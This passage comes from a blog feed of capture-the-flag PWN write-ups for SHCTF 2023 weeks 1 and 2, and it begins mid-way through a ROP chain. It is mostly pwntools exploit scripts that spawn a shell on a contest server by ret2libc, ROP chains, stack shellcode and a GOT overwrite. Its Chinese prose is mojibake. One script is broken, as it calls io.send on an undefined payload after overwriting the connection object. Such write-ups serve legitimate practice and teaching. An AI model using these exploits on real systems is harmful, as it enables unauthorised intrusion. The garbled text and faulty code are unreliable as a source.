ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401243</span>) <span class="comment"># syscall</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload =<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> +<span class="number">8</span>) + p</span><br><span class="line"> </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="babystack">babystack</span></h2><p>æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œ64ä½æ‰“å¼€äº†NX</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/9.png"></p>
<p>idaåæ±‡ç¼–ä¸€ä¸‹ï¼Œä»£ç å®¡è®¡ä½ ä¼šå‘ç°æ²¡æœ‰binshå’Œsystemï¼Œå°±å‘ç”Ÿäº†ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œä½ å°±å¯ä»¥æƒ³åˆ°æ˜¯éœ€è¦ç”¨ret2libcçš„æ–¹æ³•æ¥è§£å†³ï¼Œè¿™é¢˜æ˜¯é€šè¿‡ write å‡½æ•°æ¥æ³„éœ² libc ï¼ˆä¸æ‡‚çš„å¯ä»¥çœ‹è¿™é‡Œï¼Œå¯ä»¥å¥—ç”¨æ¨¡æ¿<a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">PWN PWN PWN !!! æŠ€å·§ (1)</a>ï¼‰è¿™é‡Œå°±ä¸å¤šè®²äº†</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/10.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#p =process(&#x27;./111&#x27;)</span></span><br><span class="line">p =remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">31645</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.23-0ubuntu11.3_amd64.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">main_addr =<span class="number">0x400718</span></span><br><span class="line">write_plt =elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got =elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ret_addr =<span class="number">0x400581</span></span><br><span class="line">rdi_addr =<span class="number">0x400833</span></span><br><span class="line">pop_rsi_r15 =<span class="number">0x400831</span></span><br><span class="line"> </span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>+<span class="number">8</span>) + p64(rdi_addr) +p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(write_got)+p64(<span class="number">0</span>) +p64(write_plt)+ p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"> </span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base +  <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"> </span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>+<span class="number">8</span>)  +p64(rdi_addr) + p64(bin_sh) +p64(sys_addr)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="showshowway">showshowway</span></h2><p>æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œ64ä½ç¨‹åºæ‰“å¼€äº†NX</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/11.png"></p>
<p>idaåæ±‡ç¼–ä¸€ä¸‹ï¼Œä»£ç å®¡è®¡ä½ ä¼šå‘ç°getså‡½æ•°é€ æˆäº†æº¢å‡ºï¼Œå¹¶ä¸”éœ€è¦è®© y ç­‰äº pï¼Œå°±å¯ä»¥ç›´æ¥ç»•è¿‡if1è¯­å¥ï¼Œæ‰§è¡Œåé—¨å‡½æ•°ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¯¥æ€ä¹ˆæ„é€ payloadï¼ˆsä¸yç›¸è·äº†0x40ä¸ªå­—èŠ‚ï¼Œæ„æ€å°±æ˜¯è¾“å…¥0x40ä¸ªå­—èŠ‚çš„æ•°æ®å°±å¯ä»¥è¦†ç›–åˆ° y ,ç„¶åå†ä¿®æ”¹å…¶å†…å®¹ï¼Œä½¿å…¶ä¸pç›¸ç­‰å°±å¯ä»¥äº†ï¼‰è¿™é‡Œéœ€è¦è®¤çœŸæ€è€ƒï¼Œè®°å½•ä¸€ä¸‹</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/12.png"></p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/13.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p =process(&#x27;./111&#x27;)</span></span><br><span class="line">p =remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">30218</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> +<span class="string">b&#x27;showshowway\x00&#x27;</span></span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="pkmon">pkmon</span></h2><p>æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œ64ä½ç¨‹åºåªæ‰“å¼€äº†NX</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/14.png"></p>
<p>idaåæ±‡ç¼–ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸ªåé—¨å‡½æ•°ï¼Œå¹¶ä¸”å‘ç°å¯ä»¥åˆ©ç”¨putsçš„gotè¡¨åœ°å€æ¥æ‰§è¡Œåé—¨å‡½æ•°ï¼Œä»è€Œè·å¾—shell</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/15.png"></p>
<p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°æ‰¾åˆ°putsçš„gotè¡¨åœ°å€ï¼Œä»è€Œæ±‚å‡ºv1çš„å€¼ï¼Œè¿™æ ·å°±å¯ä»¥æ‰“é€šäº†</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/16.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p =process(&#x27;./111&#x27;)</span></span><br><span class="line">p =remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">30452</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">got_addr =elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">backdoor = <span class="number">0x40072B</span></span><br><span class="line"> </span><br><span class="line">payload =<span class="string">b&#x27;-17&#x27;</span> +p64(backdoor)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="æ€»ç»“">æ€»ç»“</span></h1><p>è¿™æ¬¡æ¯”èµ›æ”¶è·æŒºå¤šçš„ï¼Œå¤§éƒ¨åˆ†é¢˜ç›®éƒ½æ˜¯éœ€è¦é€šè¿‡è‡ªå·±åˆ†æä»£ç æ¥è§£å†³é—®é¢˜ï¼Œéå¸¸è€ƒéªŒä»£ç å®¡è®¡çš„èƒ½åŠ›ï¼Œèƒ½åŠ›è¿˜å¾—æ…¢æ…¢æå‡ï¼ŒåŠ æ²¹ï¼ï¼ï¼</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>SHCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>SHCTF 2023 [WEEK 2] PWN</title>
    <url>/SHCTF%202023%20%5BWEEK%202%5D%20PWN/</url>
    <content><![CDATA[<p>SHCTF 2023 [WEEK 2] PWN</p>
<span id="more"></span>

<h1><span id="ç®€ä»‹">ç®€ä»‹</span></h1><p>ç¬¬äºŒå‘¨å¯¹æ¯”ç¬¬ä¸€å‘¨éš¾åº¦æé«˜äº†äº›ï¼Œå¼€å§‹è¦ç†Ÿæ‚‰åš PWN çš„æŠ€å·§æ‰‹æ³•äº†ã€‚</p>
<hr>
<h2><span id="easy_shellcode">easy_shellcode</span></h2><ul>
<li><strong>ä¿æŠ¤æœºåˆ¶</strong>ï¼šä¿æŠ¤å…¨å…³ï¼Œæ ˆå¯æ‰§è¡Œ</li>
<li><strong>åˆ©ç”¨æ€è·¯</strong>ï¼šåˆ©ç”¨ buf æ³„éœ²æ ˆåœ°å€ï¼Œå°† shellcode å†™å…¥æ ˆï¼Œæ‰§è¡Œ shellcode è·å– shell</li>
</ul>
<p>æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œä¿æŠ¤å…¨å…³ï¼ŒåŠ ä¸Šåˆæ˜¯<a href="https://so.csdn.net/so/search?q=shellcode&spm=1001.2101.3001.7020">shellcode</a>çš„ï¼Œæ ˆå¯æ‰§è¡Œï¼Œæ‰€ä»¥å¯ä»¥æŠŠshellcodeå†™å…¥æ ˆé‡Œ</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/1.png"></p>
<p><a href="https://so.csdn.net/so/search?q=ida&spm=1001.2101.3001.7020">ida</a>åæ±‡ç¼–ä¸€ä¸‹ï¼Œå‘ç°å¯ä»¥é€šè¿‡bufè¿™é‡Œæ³„éœ²å‡ºæ ˆåœ°å€ï¼ˆå› ä¸ºæ²¡æœ‰æ‰“å¼€NXä¿æŠ¤ï¼Œæ ˆæ˜¯å¯æ‰§è¡Œçš„ï¼Œè¦æƒ³åŠæ³•æŠŠshellcodeå†™å…¥æ ˆä¸Šåœ¨æ‰§è¡Œï¼‰</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/2.png"></p>
<p>gdbè°ƒè¯•ä¸‹ï¼Œä½ å°±ä¼šå‘ç°åªéœ€è¦è¾“å…¥0x10ä¸ªå­—èŠ‚ï¼Œå°±å¯ä»¥æ³„éœ²å‡ºæ ˆåœ°å€ï¼ˆrbpåœ°å€ï¼‰ï¼Œç„¶åè·ç¦»æ ˆé¡¶çš„è·ç¦»ä¸º0x80ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªåœ°å€ï¼Œå°†shellcodeå†™å…¥ï¼Œå°±å¯ä»¥æ‰§è¡Œshelläº†</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/3.png"></p>
<p>expå¦‚ä¸‹:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;112.6.51.212&#x27;</span>, <span class="number">30735</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;What&#x27;s your name?\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(stack)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;please input your strong\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="baby_rop">baby_rop</span></h2><ul>
<li><strong>ä¿æŠ¤æœºåˆ¶</strong>ï¼š32 ä½ï¼Œå¼€å¯ canary å’Œ NXï¼Œé™æ€é“¾æ¥</li>
<li><strong>åˆ©ç”¨æ–¹æ³•ä¸€</strong>ï¼šROPgadget æ„é€  payload</li>
</ul>
<p>æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œ32ä½ç¨‹åºæ‰“å¼€äº†canary å’ŒNXï¼Œå¹¶ä¸”è¿˜æ˜¯é™æ€é“¾æ¥</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/4.png"></p>
<p>ç”¨ROPgadget --ropchainæ¥è·å–ropé“¾å†ç¼©çŸ­ç‚¹ï¼Œexpå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"> </span><br><span class="line"><span class="comment">#io =process(&#x27;./simplerop32&#x27;)</span></span><br><span class="line">io =remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">30779</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804993d</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080e4e80</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080aa06a</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080537da</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804993d</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080e4e84</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080aa06a</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/sh\x00&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080537da</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line"> </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804901e</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080e4e80</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804993f</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080e4e88</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804993d</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080e4e88</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line"> </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080aa06a</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += p32(<span class="number">11</span>)</span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049b62</span>) <span class="comment"># int 0x80</span></span><br><span class="line"> </span><br><span class="line">io =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p</span><br><span class="line"> </span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>åˆ©ç”¨æ–¹æ³•äºŒ</strong>ï¼šret2syscall</li>
</ul>
<p>è¿˜å¯ä»¥ç”¨ret2sycallçš„æ–¹æ³•æ¥è§£å†³ï¼Œexpå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"> </span><br><span class="line"><span class="comment">#p =process(&#x27;./111&#x27;)</span></span><br><span class="line">p =remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">30984</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">read =<span class="number">0x805CAF0</span></span><br><span class="line">edx_ecx_ebx =<span class="number">0x8049941</span></span><br><span class="line">eax =<span class="number">0x80aa06a</span></span><br><span class="line">int_80 =<span class="number">0x8049b62</span></span><br><span class="line">bss =<span class="number">0x80e5000</span>   <span class="comment">#æ•´ç™¾å°±è¡Œ</span></span><br><span class="line"> </span><br><span class="line">payload =<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x1c</span> +<span class="number">4</span>) </span><br><span class="line">payload +=p32(read) </span><br><span class="line">payload +=p32(edx_ecx_ebx) +p32(<span class="number">0</span>) +p32(bss) +p32(<span class="number">0x8</span>) </span><br><span class="line">payload +=p32(edx_ecx_ebx) +p32(<span class="number">0</span>) +p32(<span class="number">0</span>) +p32(bss) </span><br><span class="line">payload +=p32(eax) +p32(<span class="number">11</span>) </span><br><span class="line">payload +=p32(int_80)</span><br><span class="line"> </span><br><span class="line">p.send(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="baby_rop2">baby_rop2</span></h2><ul>
<li><strong>ä¿æŠ¤æœºåˆ¶</strong>ï¼š64 ä½ï¼Œå¼€å¯ canary å’Œ NXï¼Œé™æ€é“¾æ¥</li>
<li><strong>åˆ©ç”¨æ–¹å¼</strong>ï¼šROPgadget æ„é€  ROP é“¾</li>
</ul>
<p>æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œ64ä½ç¨‹åºæ‰“å¼€canaryå’ŒNXï¼Œå¹¶ä¸”è¿˜æ˜¯é™æ€é“¾æ¥ç¨‹åºï¼Œå’Œä¸Šä¸€æ¬¡æŒºåƒçš„</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/5.png"></p>
<p>idaåæ±‡ç¼–ä¸€ä¸‹ï¼Œç®€ç®€å•å•çš„ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´ï¼Œå”¯ä¸€çƒ¦çš„å°±æ˜¯è¯¥æ€ä¹ˆæ„é€ ropæ‰§è¡Œæµ</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/6.png"></p>
<p>ä¸€æ ·å¯ä»¥ç”¨ROPgadgetæ¥æ„é€ ropæ‰§è¡Œæµï¼Œå”¯ä¸€ä¸å¥½çš„åœ°æ–¹å°±æ˜¯æœ‰é•¿åº¦é™åˆ¶ï¼Œéœ€è¦è‡ªå·±åˆ å‡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"> </span><br><span class="line"><span class="comment">#io =process(&#x27;./111&#x27;)</span></span><br><span class="line">io =remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">30992</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a30d</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000419a1c</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000041ac41</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a30d</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000417e25</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000041ac41</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401d1d</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a30d</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401858</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000419a1c</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += p64(<span class="number">59</span>)</span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401243</span>) <span class="comment"># syscall</span></span><br><span class="line"> </span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p</span><br><span class="line"> </span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="string">string</span></h2><ul>
<li><strong>ä¿æŠ¤æœºåˆ¶</strong>ï¼šå…¨å…³</li>
<li><strong>æ¼æ´ç±»å‹</strong>ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</li>
<li><strong>æ€è·¯</strong>ï¼šæ³„éœ² libcï¼Œä¿®æ”¹ printf GOT è¡¨ä¸º systemï¼Œæ‰§è¡Œ <code>/bin/sh</code></li>
</ul>
<p>æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œä¿æŠ¤å…¨å…³</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/7.png"></p>
